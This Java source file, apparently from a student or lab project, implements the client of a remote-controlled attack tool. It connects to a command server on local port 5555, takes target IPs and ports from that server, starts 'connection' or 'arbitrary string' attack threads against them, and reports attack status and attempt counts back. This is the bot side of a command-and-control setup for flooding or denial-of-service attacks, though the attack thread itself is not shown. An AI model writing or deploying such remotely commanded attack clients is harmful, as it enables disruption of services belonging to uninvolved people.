import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

public class Cliente {

	private static Estado estado = new Estado();
	private static AttackThread aThread;
	
	public static void main(String[] arg) throws UnknownHostException,
			IOException, InterruptedException {
		String ip = "";
		String[] puertos = null;
		String stringArbitrario = "";
		Socket socket = new Socket("127.0.0.1", 5555);
		Logger.LogAccionCliente("Cliente conectado a servidor 127.0.0.1, puerto: 5555");
		
		while (true) {
			DataInputStream dis = new DataInputStream(socket.getInputStream());
			Thread.sleep(500);
			String[] parametrosServidor = dis.readUTF().split("\n");
			System.out.println("Corriendo cliente");
			if (parametrosServidor != null) {
				String tipoMensaje = parametrosServidor[0];
				if (parametrosServidor.length > 1) {
					ip = parametrosServidor[1];
					puertos = parametrosServidor[2].split(",");
					stringArbitrario = new String();
					if (CantidadDeElementosEsCuatro(parametrosServidor) == true) {
						stringArbitrario = parametrosServidor[3];
					}
				}

				switch (tipoMensaje) {
				case "Ataque de conexion":
					IniciarAtaque(ip, puertos);
					break;

				case "String Arbitrario":
					IniciarAtaqueStringArbitrario(ip, puertos, stringArbitrario);
					break;

				case "Estado":
					DevolverEstado(socket);
					break;
				}
			}
		}
	}

	private static void DevolverEstado(Socket socket)
			throws UnknownHostException, IOException {

		DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
		if (estado.getPuertos() == null) {
			dos.writeUTF("Esperando");
			Logger.LogAccionCliente("Devolucion de estado: Esperando");
		} else {
			dos.writeUTF(SerializarEstado());
			Logger.LogAccionCliente("Devolucion de estado: "
					+ SerializarEstado());
		}
	}

	private static String SerializarEstado() {
		StringBuilder estadoSerializado = new StringBuilder();
		String descripcion = estado.getDescripcion();
		Date fechaInicio = estado.getFechaInicio();
		String ip = estado.getIp();
		String puertos = "";
		for (Puerto puerto : estado.getPuertos()) {
			puertos = puertos + "Puerto: " + puerto.getPuerto()
					+ " Cantidad de ataques: " + puerto.getContadorIntentos()
					+ ", \n";
		}
		estadoSerializado.append("Tipo de Ataque: " + descripcion + " ");
		estadoSerializado.append("\r\n");
		java.util.Date date = new java.util.Date();
		java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat(
				"dd/MM/yyyy");
		String fecha = sdf.format(date);
		estadoSerializado.append("Fecha Inicio Ataque: " + sdf.format(estado.getFechaInicio()));
		estadoSerializado.append("\r\n");
		estadoSerializado.append("Ip: " + estado.getIp() + " ");
		estadoSerializado.append("\r\n");
		estadoSerializado.append(puertos);

		return estadoSerializado.toString();
	}

	public static long cantidadTotalHoras(Calendar fechaInicial,
			Calendar fechaFinal) {
		long totalMinutos = 0;
		totalMinutos = ((fechaFinal.getTimeInMillis() - fechaInicial
				.getTimeInMillis()) / 1000 / 60 / 60);
		return totalMinutos;
	}

	private static boolean CantidadDeElementosEsCuatro(
			String[] parametrosServidor) {
		if (parametrosServidor.length == 4)
			return true;
		else
			return false;
	}

	private static void IniciarAtaqueStringArbitrario(String ip,
			String[] puertos, String stringArbitrario)
			throws InterruptedException, IOException {
		if(aThread != null)
		{
			aThread.stop();
		}
		int x = 0;
		InicializarEstado(puertos, "Ataque de String Arbitrario", ip);

		aThread = new AttackThread(ip, puertos, estado,
				stringArbitrario);
		aThread.start();
	}

	private static void IniciarAtaque(String ip, String[] puertos)
			throws IOException, InterruptedException {
		int x = 0;
		if(aThread != null)
		{
			aThread.stop();
		}
		InicializarEstado(puertos, "Ataque de conexion", ip);
		String puertosAsString = "";
		for (x = 0; x < puertos.length; x++) {
			puertosAsString = puertosAsString + puertos[x] + ", ";
		}
		aThread = new AttackThread(ip, puertos, estado);
		Logger.LogAccionCliente("Ataque de conexion a IP: " + ip.toString()
				+ ", Puertos: " + puertosAsString);
		aThread.start();
	}

	private static void InicializarEstado(String[] puertos, String tipoAtaque,
			String ip) throws IOException {
		estado.setDescripcion(tipoAtaque);
		estado.setFechaInicio(new Date());
		estado.setIp(ip);
		ArrayList<Puerto> puertosList = new ArrayList<Puerto>();
		for (int x = 0; x < puertos.length; x++) {
			Puerto puerto = new Puerto();
			puerto.setPuerto(puertos[x].toString());
			puerto.setContadorIntentos(0);
			puertosList.add(puerto);
		}
		Logger.LogAccionCliente("Se inicia estado");
		estado.setPuertos(puertosList);
	}

	public Estado getEstado() {
		return estado;
	}

	public void setEstado(Estado estado) {
		this.estado = estado;
	}
}
